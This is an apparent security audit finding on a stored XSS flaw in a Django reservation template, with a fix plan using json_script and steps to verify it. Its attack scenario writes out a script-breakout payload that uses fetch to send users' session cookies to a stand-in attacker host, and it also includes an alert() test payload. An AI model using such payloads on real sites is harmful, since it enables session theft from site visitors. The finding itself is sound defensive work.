# B04 Script Injection via Unsafe JSON Embedding in reservation.html

**Severity:** MEDIUM
**File:** `templates/pages/reservation.html:242`
**Type:** XSS (Cross-Site Scripting) / Script Injection

## Description

`templates/pages/reservation.html` line 242 embeds the `massages_json` context variable directly inside a `<script>` block using the `|safe` filter:

```javascript
const MASSAGES = {{ massages_json|safe }};
```

`massages_json` is built in `ReservationPage.get_context_data` (views.py lines 136–145) by serialising all `Massage` objects with `json.dumps`:

```python
context['massages_json'] = json.dumps([
    {
        'id': m.pk,
        'name': m.name,
        'duration': m.duration_in_minutes,
        'price': str(m.price).rstrip('0').rstrip('.') if m.price else '',
        'desc': m.short_description or (m.description[:100] if m.description else ''),
    }
    for m in Massage.objects.all()
])
```

The problem is using `|safe` to inject JSON into a `<script>` block. `json.dumps` does not escape the string `</script>`, which terminates the enclosing script tag prematurely. A massage `name` or `description` containing `</script><script>alert(1)</script>` would break out of the JSON literal and inject arbitrary HTML/JavaScript.

`json.dumps` also does not escape Unicode line terminators ` ` and ` `, which are legal in JSON but are treated as line terminators in JavaScript and can cause syntax errors or injection in certain contexts.

The correct Django pattern is the `json_script` template filter, which:
- Wraps the value in a `<script type="application/json" id="...">` tag
- Escapes `<`, `>`, `&`, `'` inside the JSON string, making `</script>` injection impossible
- Is purpose-built for exactly this use case

**Current risk level:** The data source (`Massage` model fields) is currently admin-controlled, which limits the attack surface to a compromised admin account. The severity would immediately become CRITICAL if massage data were ever sourced from user input, an external API, or a database import without sanitisation. Using `|safe` in a `<script>` context is an anti-pattern regardless of the current data source.

## Attack Scenario

**Scenario A — compromised admin (current code):**

1. Attacker gains access to a Django admin account.
2. Attacker sets a `Massage.name` to:
   ```
   Valid Massage</script><script>fetch('https://attacker.example/steal?c='+document.cookie)</script>
   ```
3. `json.dumps` encodes this as a JSON string but does not escape `</script>`.
4. The rendered page contains:
   ```html
   <script>
   const MASSAGES = [{"id": 1, "name": "Valid Massage</script><script>fetch(...)</script>", ...}];
   </script>
   ```
5. The browser's HTML parser sees `</script>` and ends the first script block. The second `<script>` tag executes the payload.
6. Every authenticated user who visits the reservation page has their session cookie exfiltrated.

**Scenario B — future data pipeline change (latent risk):**

If massage data is ever imported from a CSV, a third-party API, or user-submitted content, the injection surface opens to any untrusted data source without requiring any code change to exploit.

## Fix Plan

Replace `|safe` with Django's built-in `json_script` filter.

**In the view (`massageProject/main_app/views.py`):** No change needed — `json.dumps` can stay, or the raw Python list can be passed directly (see below).

**In the template (`templates/pages/reservation.html`):**

Step 1 — replace the inline JSON assignment (line 242):

Before:
```javascript
const MASSAGES = {{ massages_json|safe }};
```

After (add this above the `<script>` block, or anywhere in the template body):
```django
{{ massages_json|json_script:"massages-data" }}
```

Then inside the `<script>` block, read the safely-embedded value:
```javascript
const MASSAGES = JSON.parse(document.getElementById('massages-data').textContent);
```

`json_script` renders a `<script type="application/json">` element with the JSON safely escaped (all `<`, `>`, `&` characters are entity-encoded inside the JSON). `JSON.parse` on `.textContent` gives the identical JavaScript object as before.

**Alternative — pass the raw list from the view and let `json_script` serialise it:**

In views.py, change:
```python
context['massages_json'] = json.dumps([...])
```
to:
```python
context['massages_data'] = [...]
```

In the template:
```django
{{ massages_data|json_script:"massages-data" }}
```
```javascript
const MASSAGES = JSON.parse(document.getElementById('massages-data').textContent);
```

This removes `json.dumps` from the view entirely and lets Django handle serialisation and escaping in one step.

## Verification

1. In the Django admin, set a `Massage` object's `name` to:
   ```
   Test</script><script>alert('B04')</script>
   ```
2. Load `/reservation/` while authenticated.
3. **Before fix:** an alert dialog fires (script injection succeeded).
4. **After fix:** no dialog; view page source and confirm the `<script type="application/json" id="massages-data">` element contains `</script>` (the escaped form), and the original `<script>` block is intact and unbroken.
5. Confirm `JSON.parse(document.getElementById('massages-data').textContent)` in the browser console returns the correct array with the literal string `Test</script>...` as the `name` value.
